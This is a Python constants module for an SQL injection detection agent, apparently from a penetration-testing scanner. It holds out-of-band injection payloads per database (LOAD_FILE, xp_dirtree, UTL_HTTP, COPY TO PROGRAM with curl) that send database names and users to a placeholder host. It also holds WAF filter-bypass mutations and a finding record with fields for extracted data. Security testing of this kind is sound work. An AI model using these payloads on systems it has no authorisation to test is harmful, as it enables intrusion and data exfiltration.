"""
SQLi Agent Types

Dataclasses, enums, and constants for SQL injection detection.
Extracted from sqli_agent.py for modularity.
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any


# =============================================================================
# DATABASE FINGERPRINTS
# =============================================================================

DB_FINGERPRINTS: Dict[str, List[str]] = {
    "MySQL": [
        r"mysql", r"mariadb", r"You have an error in your SQL syntax",
        r"Warning.*mysql_", r"MySQLSyntaxErrorException", r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySqlClient\.", r"com\.mysql\.jdbc", r"Syntax error.*MySQL"
    ],
    "PostgreSQL": [
        r"postgresql", r"pg_", r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql", r"ERROR:\s*syntax error at or near",
        r"valid PostgreSQL result", r"unterminated quoted string at or near"
    ],
    "MSSQL": [
        r"microsoft.*sql.*server", r"mssql", r"Unclosed quotation mark",
        r"SqlException", r"Incorrect syntax near", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"Procedure.*expects parameter"
    ],
    "Oracle": [
        r"oracle", r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"oracle\.jdbc", r"SQL command not properly ended"
    ],
    "SQLite": [
        r"sqlite", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
        r"unrecognized token", r"unable to open database file",
        r"near \".*\": syntax error"
    ]
}

TECHNIQUE_DESCRIPTIONS: Dict[str, str] = {
    "error_based": "Error-based injection causes the database to reveal error messages containing query information.",
    "time_based": "Time-based blind injection infers data by measuring response delays (e.g., SLEEP commands).",
    "boolean_based": "Boolean-based blind injection infers data by observing different responses to true/false conditions.",
    "union_based": "UNION-based injection retrieves data by appending a UNION SELECT query.",
    "stacked": "Stacked queries injection executes multiple SQL statements in a single request.",
    "oob": "Out-of-Band injection exfiltrates data via DNS or HTTP requests to an external server."
}


# =============================================================================
# PARAMETER PRIORITIZATION
# =============================================================================

HIGH_PRIORITY_SQLI_PARAMS: List[str] = [
    # Numeric IDs (HIGHEST priority - most common SQLi vectors)
    "id", "user_id", "userid", "product_id", "productid", "item_id", "itemid",
    "order_id", "orderid", "category_id", "categoryid", "article_id", "post_id",
    "comment_id", "invoice_id", "account_id", "customer_id", "session_id",

    # Sorting/Pagination (ORDER BY injection)
    "sort", "order", "orderby", "sortby", "sort_by", "order_by",
    "limit", "offset", "page", "per_page", "pagesize",
    "dir", "direction", "asc", "desc",

    # Search/Filter (WHERE clause injection)
    "search", "q", "query", "filter", "keyword", "keywords", "term",
    "find", "lookup", "s", "w",

    # Selection/Column (dangerous - direct SQL manipulation)
    "select", "column", "columns", "field", "fields", "table", "col",

    # Auth-related (high value targets)
    "username", "user", "email", "login", "password", "pass", "pwd",
    "token", "auth", "key", "apikey",

    # File/Path (potential for LOAD_FILE)
    "file", "filename", "path", "filepath", "document", "doc",

    # Misc common
    "name", "title", "type", "status", "action", "mode", "view",
    "report", "data", "value", "val", "num", "no", "number",
]

MEDIUM_PRIORITY_PARAMS: List[str] = [
    "date", "from", "to", "start", "end", "year", "month", "day",
    "price", "amount", "qty", "quantity", "size", "count",
    "lang", "language", "locale", "country", "region",
    "format", "output", "template", "theme", "style",
]


# =============================================================================
# OOB PAYLOADS (Per Database)
# =============================================================================

OOB_PAYLOADS: Dict[str, List[str]] = {
    "MySQL": [
        # DNS exfiltration via LOAD_FILE
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT database()), '.{oob_host}\\\\a'))-- ",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.{oob_host}\\\\a'))-- ",
        # HTTP via INTO OUTFILE (rare but possible)
        "' UNION SELECT 'test' INTO OUTFILE '//{oob_host}/share/test.txt'-- ",
    ],
    "MSSQL": [
        # xp_dirtree (most reliable)
        "'; EXEC master..xp_dirtree '//{oob_host}/sqli'-- ",
        "'; EXEC master.dbo.xp_dirtree '//{oob_host}/sqli'-- ",
        # xp_fileexist
        "'; EXEC master..xp_fileexist '//{oob_host}/sqli'-- ",
        # OPENROWSET
        "'; SELECT * FROM OPENROWSET('SQLOLEDB', 'server={oob_host}')-- ",
    ],
    "Oracle": [
        # UTL_HTTP (most common)
        "' AND UTL_HTTP.REQUEST('http://{oob_host}/'||(SELECT user FROM dual))='x'-- ",
        # UTL_INADDR
        "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{oob_host}') FROM dual) IS NOT NULL-- ",
        # HTTPURITYPE
        "' AND (SELECT HTTPURITYPE('http://{oob_host}/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL-- ",
    ],
    "PostgreSQL": [
        # COPY TO PROGRAM (requires superuser)
        "'; COPY (SELECT '') TO PROGRAM 'curl http://{oob_host}/sqli'-- ",
        # dblink (if extension available)
        "'; SELECT dblink_connect('host={oob_host} dbname=test')-- ",
    ],
    "SQLite": [
        # SQLite doesn't have OOB capabilities
    ],
    "generic": [
        # Generic payloads that might work
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- ",
    ]
}


# =============================================================================
# FILTER BYPASS MUTATIONS
# =============================================================================

FILTER_MUTATIONS: Dict[str, List[str]] = {
    "'": ["''", "\\'", "%27", "\\x27", "char(39)", "chr(39)"],
    '"': ['""', '\\"', "%22", "\\x22", "char(34)"],
    " ": ["/**/", "%20", "+", "%09", "%0a", "%0d", "/*comment*/"],
    "=": [" LIKE ", " REGEXP ", " RLIKE ", " IN (", " BETWEEN "],
    "OR": ["||", "oR", "Or", "OR/**/", "O/**/R"],
    "AND": ["&&", "aNd", "AnD", "AND/**/", "A/**/ND"],
    "UNION": ["UNI/**/ON", "UnIoN", "UNION/**/", "/*!UNION*/"],
    "SELECT": ["SEL/**/ECT", "SeLeCt", "SELECT/**/", "/*!SELECT*/"],
    "--": ["#", "/*", ";%00", "-- -"],
    "#": ["--", "/*", ";%00"],
}


# =============================================================================
# CONFIDENCE HIERARCHY
# =============================================================================

class SQLiConfidenceTier:
    """
    Confidence tiers for SQLi findings.

    TIER 3 (MAXIMUM): Data extracted, 100% confirmed
    TIER 2 (HIGH): Clear SQL error or behavior change
    TIER 1 (MEDIUM): Behavioral indication, needs verification
    TIER 0 (LOW): Anomaly detected, likely false positive
    """
    MAXIMUM = 3  # Union/Error with data, OOB callback received
    HIGH = 2     # Clear SQL error, boolean with >50% diff
    MEDIUM = 1   # Boolean with small diff, time-based triple verified
    LOW = 0      # Single time-based, anomaly without confirmation


# =============================================================================
# SQLiFinding DATACLASS
# =============================================================================

@dataclass
class SQLiFinding:
    """
    Represents a confirmed SQL Injection finding with detailed reproduction data.
    """
    url: str
    parameter: str
    type: str = "SQLI"
    severity: str = "CRITICAL"

    # Core Classification
    injection_type: str = "unknown"  # UNION-based, boolean-blind, etc.
    technique: str = "unknown"       # Internal code (BEUSTQ)

    # Payload & Exploit
    working_payload: str = ""
    payload_encoded: str = ""
    exploit_url: str = ""
    exploit_url_encoded: str = ""

    # Evidence / Extraction
    columns_detected: Optional[int] = None
    column_detection_payload: Optional[str] = None
    extracted_databases: List[str] = field(default_factory=list)
    extracted_tables: List[str] = field(default_factory=list)
    sample_data: Optional[Dict] = None

    # Metadata
    dbms_detected: str = "unknown"
    sqlmap_command: str = ""
    sqlmap_output_summary: str = ""
    curl_command: str = ""
    sqlmap_reproduce_command: str = ""

    # Validation
    validated: bool = False
    evidence: Dict[str, Any] = field(default_factory=dict)
    reproduction_steps: List[str] = field(default_factory=list)
    status: str = "PENDING_VALIDATION"
    exploitation_explanation: str = ""


__all__ = [
    "DB_FINGERPRINTS",
    "TECHNIQUE_DESCRIPTIONS",
    "HIGH_PRIORITY_SQLI_PARAMS",
    "MEDIUM_PRIORITY_PARAMS",
    "OOB_PAYLOADS",
    "FILTER_MUTATIONS",
    "SQLiConfidenceTier",
    "SQLiFinding",
]
